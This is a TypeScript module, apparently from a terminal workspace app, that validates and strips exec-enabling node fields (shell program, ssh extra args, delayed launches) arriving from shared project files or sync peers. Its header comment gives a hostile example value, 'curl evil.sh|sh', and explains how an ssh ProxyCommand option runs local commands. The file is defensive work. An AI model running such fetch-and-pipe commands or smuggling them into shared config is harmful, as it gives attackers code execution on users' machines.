/**
 * Trust boundary for the node fields that end up EXECUTING something.
 *
 * `.nodeterm/project.json` is hostile input: it is git-shared, hand-editable, auto-adopted by
 * "Open folder…", and for an SSH project it lives on the remote host. A value that arrives from
 * that file was never typed by the local user, so it must never become a command. The codebase
 * already honors this for `initialCommand` (deliberately never serialized); two siblings reach an
 * exec the same way and are handled here:
 *
 *  - `NodeState.shell` — the session program. It lands as tmux `new-session`'s trailing command
 *    argument, and tmux runs a lone command argument THROUGH A SHELL. A cloned repo could ship
 *    `"shell": "curl evil.sh|sh"`, or simply point at a script committed in the repo.
 *  - `NodeState.ssh.extraArgs` — spliced verbatim into the `ssh` argv (`buildSshArgs`), where
 *    `-o ProxyCommand=<cmd>` makes ssh run `<cmd>` LOCALLY through /bin/sh.
 *
 * Both are legitimate when the LOCAL user sets them, so they are not deleted — they are made
 * MACHINE-LOCAL: `stripSharedNodeExec` keeps them out of every project file we write, and
 * `localNodeExec` / `applyLocalNodeExec` round-trip them through the machine-local workspace.json
 * index instead (`IndexEntryV3.localExec`). A project file therefore contributes NOTHING to either
 * field: the safe fallback (default shell / no extra ssh args) is what an unrecognized or foreign
 * value degrades to.
 *
 * `safeSessionProgram` is the second layer, applied where the value BECOMES a command (pty-manager),
 * in the same idiom as `permissionModeFlag` re-validating at the interpolation site: whatever the
 * path a value took to get there (a peer canvas mutation, a stale in-memory node, a future caller),
 * a program string carrying shell metacharacters is never handed to tmux.
 */

import { BUILTIN_AGENT_IDS, isPermissionMode } from './agents/config'
import { sshExtraArgsEnableLocalExec } from './ssh'
import type { AgentLaunchIntent, CanvasNodeState, PendingLaunch } from './types'

/** Per-node exec values the LOCAL machine typed. Persisted only in the machine-local index. */
export interface LocalNodeExec {
  /** `NodeState.shell` — a custom session program for this node. */
  shell?: string
  /** `NodeState.terminalProfileId` — this machine's snapshotted Windows profile choice. */
  terminalProfileId?: string
  /** `NodeState.ssh.extraArgs` — raw advanced ssh args for this node's connection. */
  sshExtraArgs?: string
  /** A delayed launch authorized on this machine; never accepted from project files or peers. */
  pendingLaunch?: PendingLaunch
}

/** Node id → the exec values that stay on this machine. */
export type LocalNodeExecMap = Record<string, LocalNodeExec>

/**
 * A session program must be ONE program, not a command line: tmux runs a lone command argument
 * through a shell, so anything a shell would interpret is refused. Absolute paths, bare names and
 * `~`-less relative paths are fine; whitespace, quotes, `;|&$()<>` … and a leading `-` (which tmux
 * would read as an option) are not.
 */
const SAFE_PROGRAM = /^[A-Za-z0-9_./+@:=-]+$/
const SAFE_OPAQUE_ID = /^[A-Za-z0-9][A-Za-z0-9._-]{0,255}$/
const SAFE_CUSTOM_AGENT_ID = /^custom:[A-Za-z0-9][A-Za-z0-9._-]{0,255}$/
const UUID_V4 = /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i
const BUILTIN_AGENT_ID_SET = new Set<string>(BUILTIN_AGENT_IDS)
const MAX_PENDING_DEPS = 256
const MAX_INTENT_TEXT = 1024 * 1024

const isRecord = (value: unknown): value is Record<string, unknown> =>
  typeof value === 'object' && value !== null && !Array.isArray(value)

const isSafeAgentId = (value: unknown): value is string =>
  typeof value === 'string' &&
  (BUILTIN_AGENT_ID_SET.has(value) || SAFE_CUSTOM_AGENT_ID.test(value))

/**
 * Validate and deep-clone a locally authorized delayed launch before it enters or leaves the
 * trusted overlay. Reconstructing the allowlisted shape matters: workspace.json is hand-editable,
 * and retaining an unknown future field here could accidentally make it executable later.
 *
 * Legacy `{ after, command }` records are deliberately rejected. They were formerly written into
 * git-shared project files, so there is no provenance that can make their rendered shell source
 * trustworthy after an upgrade.
 */
function clonePendingLaunch(value: unknown): PendingLaunch | undefined {
  if (!isRecord(value)) return undefined
  if (
    !Array.isArray(value.after) ||
    value.after.length > MAX_PENDING_DEPS ||
    !value.after.every((id): id is string => typeof id === 'string' && SAFE_OPAQUE_ID.test(id)) ||
    typeof value.launchId !== 'string' ||
    !UUID_V4.test(value.launchId) ||
    !isRecord(value.launch)
  ) {
    return undefined
  }

  const raw = value.launch
  if (raw.kind === 'shell-command') {
    if (
      typeof raw.command !== 'string' ||
      raw.command.length === 0 ||
      raw.command.length > MAX_INTENT_TEXT
    )
      return undefined
    return {
      after: [...value.after],
      launchId: value.launchId,
      launch: { kind: 'shell-command', command: raw.command }
    }
  }

  if (
    raw.kind !== 'agent' ||
    (raw.action !== 'start' && raw.action !== 'resume') ||
    !isSafeAgentId(raw.agentId) ||
    (raw.permissionMode !== undefined && !isPermissionMode(raw.permissionMode))
  ) {
    return undefined
  }

  if (raw.action === 'start') {
    if (
      raw.sessionId !== undefined ||
      (raw.prompt !== undefined &&
        (typeof raw.prompt !== 'string' || raw.prompt.length > MAX_INTENT_TEXT)) ||
      (raw.newSessionId !== undefined &&
        (typeof raw.newSessionId !== 'string' || !SAFE_OPAQUE_ID.test(raw.newSessionId)))
    ) {
      return undefined
    }
    const launch: AgentLaunchIntent = {
      kind: 'agent', action: 'start', agentId: raw.agentId
    }
    if (raw.prompt !== undefined) launch.prompt = raw.prompt
    if (raw.permissionMode !== undefined) launch.permissionMode = raw.permissionMode
    if (raw.newSessionId !== undefined) launch.newSessionId = raw.newSessionId
    return { after: [...value.after], launchId: value.launchId, launch }
  }

  if (
    raw.prompt !== undefined ||
    raw.newSessionId !== undefined ||
    typeof raw.sessionId !== 'string' ||
    !SAFE_OPAQUE_ID.test(raw.sessionId)
  ) {
    return undefined
  }
  const launch: AgentLaunchIntent = {
    kind: 'agent', action: 'resume', agentId: raw.agentId, sessionId: raw.sessionId
  }
  if (raw.permissionMode !== undefined) launch.permissionMode = raw.permissionMode
  return { after: [...value.after], launchId: value.launchId, launch }
}

/**
 * Validate a session program at the point it becomes a command. Returns the program when it is
 * safe to hand to tmux/node-pty, else `undefined` — i.e. the caller falls back to the default
 * shell, which is exactly the pre-feature behavior. NEVER throws: an unrecognized value degrades
 * to the safe path, it does not block the launch.
 */
export function safeSessionProgram(shell: string | undefined): string | undefined {
  if (!shell) return undefined
  const s = shell.trim()
  if (!s || s.startsWith('-')) return undefined
  if (!SAFE_PROGRAM.test(s)) return undefined
  return s
}

/**
 * Strip every exec-enabling field from the nodes we are about to write into a SHARED project file.
 * The values survive on this machine via `localNodeExec` (below); what leaves for git/the remote
 * host carries no command or local profile selection of any kind.
 */
function stripNodeExec(n: CanvasNodeState): CanvasNodeState {
  if (
    n.shell === undefined &&
    n.terminalProfileId === undefined &&
    n.pendingLaunch === undefined &&
    n.ssh?.extraArgs === undefined &&
    n.ssh?.execTrusted === undefined
  )
    return n
  const out: CanvasNodeState = { ...n }
  delete out.shell
  delete out.terminalProfileId
  delete out.pendingLaunch
  if (out.ssh) {
    // `execTrusted` goes with the value it vouches for. It is a MACHINE-LOCAL provenance marker:
    // if it could ride a document or a wire frame, a hostile one would simply set it to true.
    const { extraArgs: _extraArgs, execTrusted: _execTrusted, ...conn } = out.ssh
    out.ssh = conn
  }
  return out
}

export function stripSharedNodeExec(nodes: CanvasNodeState[]): CanvasNodeState[] {
  return nodes.map(stripNodeExec)
}

/**
 * Strip the exec-enabling fields from a node that arrived OVER THE WIRE (a canvas-sync peer's
 * mutation, or a relay client's).
 *
 * This is the other half of the trust boundary, and without it the disk half was worthless: a peer
 * mutation is applied VERBATIM (`isCanvasMutation` validates only id/position/size), and the next
 * save harvests whatever `shell` / `ssh.extraArgs` are now in the live nodes into the MACHINE-LOCAL
 * `workspace.json` — where they are re-attached as this machine's own values on every load, for
 * ever, surviving the peer leaving, being revoked, and the app restarting. The peer laundered an
 * exec field into the trusted store.
 *
 * A peer has no business setting any of these fields on our machine: they are per-machine settings
 * (which profile/program to run here, which ssh options to pass here), and none is meaningful on a
 * canvas that is merely being mirrored. So they are dropped at ingest, on every surface.
 */
export function sanitizeInboundNode(node: CanvasNodeState): CanvasNodeState {
  return stripNodeExec(node)
}

/**
 * Normalize delayed launches read from a MACHINE-LOCAL legacy/inline workspace record.
 *
 * Unlike `sanitizeInboundNode`, this path may retain a valid typed launch because the document is
 * the local user's own store. It still re-validates and deep-clones the value: workspace.json is
 * hand-editable, and old versions persisted `{ after, command }` without trustworthy provenance.
 */
export function normalizeLocalPendingLaunch(nodes: CanvasNodeState[]): CanvasNodeState[] {
  return nodes.map((node) => {
    if (node.pendingLaunch === undefined) return node
    const pendingLaunch = node.kind === 'terminal'
      ? clonePendingLaunch(node.pendingLaunch)
      : undefined
    const out: CanvasNodeState = { ...node }
    if (pendingLaunch === undefined) delete out.pendingLaunch
    else out.pendingLaunch = pendingLaunch
    return out
  })
}

/**
 * Accept a genuinely new terminal/agent node on a Windows desktop host. The sender's execution
 * fields are always stripped first; then the receiving host snapshots its own current default.
 * Existing nodes must not use this helper — their already-snapshotted local selection is carried
 * by `carryLocalNodeExec`, so a later default change never rewrites them.
 *
 * An absent default is the deliberate non-Windows/Server behavior: sanitize only.
 */
export function acceptNewInboundNode(
  node: CanvasNodeState,
  defaultTerminalProfileId?: string
): CanvasNodeState {
  const clean = sanitizeInboundNode(node)
  if (!defaultTerminalProfileId || clean.kind !== 'terminal' || clean.ssh) return clean
  return { ...clean, terminalProfileId: defaultTerminalProfileId }
}

/**
 * Apply an inbound node OVER the copy we already hold, keeping OUR exec fields on it.
 *
 * Stripping the peer's values is only half of it: an upsert REPLACES the node, so a teammate merely
 * dragging our ssh terminal would otherwise hand us back a copy with no `extraArgs` — and the next
 * save would harvest that empty node and erase the jump host from our own machine-local index. The
 * exec fields are per-machine, so they simply do not participate in the sync: theirs are dropped,
 * ours are carried across every mutation that touches the node.
 */
export function carryLocalNodeExec(
  prev: CanvasNodeState | undefined,
  next: CanvasNodeState
): CanvasNodeState {
  if (!prev) return next
  const extraArgs = prev.ssh?.extraArgs
  const pendingLaunch = next.kind === 'terminal' ? clonePendingLaunch(prev.pendingLaunch) : undefined
  if (
    prev.shell === undefined &&
    prev.terminalProfileId === undefined &&
    extraArgs === undefined &&
    pendingLaunch === undefined
  )
    return next
  const out: CanvasNodeState = { ...next }
  if (prev.shell !== undefined) out.shell = prev.shell
  if (prev.terminalProfileId !== undefined) out.terminalProfileId = prev.terminalProfileId
  if (extraArgs !== undefined && out.ssh)
    out.ssh = { ...out.ssh, extraArgs, execTrusted: prev.ssh?.execTrusted }
  if (pendingLaunch !== undefined) out.pendingLaunch = pendingLaunch
  return out
}

/** `sanitizeInboundNode` for a whole mutation (the stamps — `src`, `seq`, `seen` — are preserved).
 *  Only `upsert` carries a node; every other op (`remove`, and the edge ops, which carry nothing
 *  but ids) passes through untouched. */
export function sanitizeInboundMutation<T extends { op: string }>(m: T): T {
  if (m.op !== 'upsert') return m
  const up = m as unknown as { node: CanvasNodeState }
  const node = sanitizeInboundNode(up.node)
  return node === up.node ? m : ({ ...m, node } as T)
}

/**
 * Collect the machine-local exec values of these nodes (for the workspace.json index entry).
 *
 * The index is the TRUSTED store — whatever lands here is re-attached to the node on every future
 * load, as this machine's own value. So an inbound value must not be able to launder itself in
 * (see `sanitizeInboundNode`, which is the primary guard), and this collector re-checks what it is
 * about to bless:
 *  - `shell` — only if it still passes the exec-site validator. A program the exec site would
 *    refuse anyway has no business being persisted as trusted.
 *  - `ssh.extraArgs` — an exec-enabling value (a `ProxyCommand` & co) is stored only when it is
 *    `execTrusted`, i.e. a LOCAL producer set it (the user's SSH server store, or a previous
 *    machine-local index entry). Harmless args are stored either way, so nothing legitimate is lost.
 */
export function localNodeExec(nodes: CanvasNodeState[]): LocalNodeExecMap | undefined {
  const map: LocalNodeExecMap = {}
  for (const n of nodes) {
    const entry: LocalNodeExec = {}
    if (n.shell && safeSessionProgram(n.shell)) entry.shell = n.shell
    // The id is opaque here on purpose: availability is machine state and may change after the
    // node is saved. The trusted core resolver validates it at spawn and reports an unavailable
    // profile rather than silently switching shells. This boundary only decides provenance.
    if (n.terminalProfileId !== undefined) entry.terminalProfileId = n.terminalProfileId
    const extraArgs = n.ssh?.extraArgs
    if (extraArgs && (n.ssh?.execTrusted || !sshExtraArgsEnableLocalExec(extraArgs)))
      entry.sshExtraArgs = extraArgs
    if (n.kind === 'terminal') entry.pendingLaunch = clonePendingLaunch(n.pendingLaunch)
    if (
      entry.shell ||
      entry.terminalProfileId !== undefined ||
      entry.sshExtraArgs ||
      entry.pendingLaunch
    )
      map[n.id] = entry
  }
  return Object.keys(map).length ? map : undefined
}

/**
 * Re-attach this machine's own exec values to nodes just read from a project file. Anything the
 * FILE carried in those fields is dropped first (it is not ours), so a hostile/cloned project.json
 * can only ever produce the safe default. Keyed by node id, which is stable (it is the tmux
 * session name) — a foreign file that happens to reuse an id can still only inherit a value the
 * local user typed themselves.
 */
export function applyLocalNodeExec(
  nodes: CanvasNodeState[],
  local: LocalNodeExecMap | undefined
): CanvasNodeState[] {
  return nodes.map((n) => {
    const mine = local?.[n.id]
    const out: CanvasNodeState = stripNodeExec(n)
    if (mine?.shell) out.shell = mine.shell
    if (mine?.terminalProfileId !== undefined) out.terminalProfileId = mine.terminalProfileId
    if (out.ssh && mine?.sshExtraArgs) {
      // Ours: it came out of the machine-local index, so the exec site may honor an option like
      // ProxyCommand (a jump host is a legitimate thing to have configured).
      out.ssh = { ...out.ssh, extraArgs: mine.sshExtraArgs, execTrusted: true }
    }
    if (out.kind === 'terminal') {
      const pendingLaunch = clonePendingLaunch(mine?.pendingLaunch)
      if (pendingLaunch !== undefined) out.pendingLaunch = pendingLaunch
    }
    return out
  })
}
